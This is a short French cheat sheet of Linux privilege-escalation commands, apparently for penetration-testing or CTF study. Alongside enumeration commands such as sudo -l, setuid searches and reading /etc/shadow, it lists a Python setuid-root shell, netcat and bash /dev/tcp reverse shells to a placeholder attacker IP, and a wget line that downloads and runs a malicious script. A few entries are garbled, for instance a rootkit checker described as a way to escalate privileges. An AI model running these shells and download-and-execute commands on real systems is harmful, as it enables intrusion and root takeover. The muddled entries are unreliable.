## Escalade de Privilèges - Linux

```sudo -l``` : Liste des commandes sudo autorisées pour l'utilisateur actuel

whoami : Affiche l'utilisateur courant

id : Affiche les UID et GID de l'utilisateur

find / -perm -4000 : Recherche des fichiers avec le bit setuid activé

find / -perm -2000 : Recherche des fichiers avec le bit setgid activé

ls -la /etc/sudoers.d/ : Vérifie les fichiers de configuration sudo

cat /etc/passwd : Liste des utilisateurs

cat /etc/shadow : Affiche les mots de passe chiffrés (nécessite des privilèges)

chmod +s /path/to/executable : Définit le bit setuid sur un exécutable

python -c 'import os; os.setuid(0); os.system("/bin/bash")' : Exécution d'une commande avec les privilèges root via Python

perl -e 'exec "/bin/bash";' : Escalade de privilèges via Perl

nc -e /bin/bash <attacker-ip> <port> : Shell inverse avec netcat (si autorisé)

/bin/bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1 : Shell inverse via Bash

wget <url> -O /tmp/reverse_shell.sh && chmod +x /tmp/reverse_shell.sh && /tmp/reverse_shell.sh : Téléchargement et exécution d'un script malveillant

setuid binary exploitation : Exploitation de binaires setuid pour obtenir des privilèges root

dmesg | grep -i 'version' : Recherche de la version du noyau (pour trouver des exploits de vulnérabilité du noyau)

ls /lib/x86_64-linux-gnu/ld-*.so : Recherche des chemins vers le chargeur dynamique

env VAR='bash -i' sudo -u root /bin/bash : Exécution de Bash avec les privilèges root via sudo

su - : Changer d'utilisateur (si vous avez les privilèges nécessaires)

cron job : Exploitation des tâches cron mal configurées pour l'escalade

auditctl -l : Vérifie les règles d'audit pour détecter des privilèges inutiles

checkrootkit : Détecte des rootkits pour escalader les privilèges
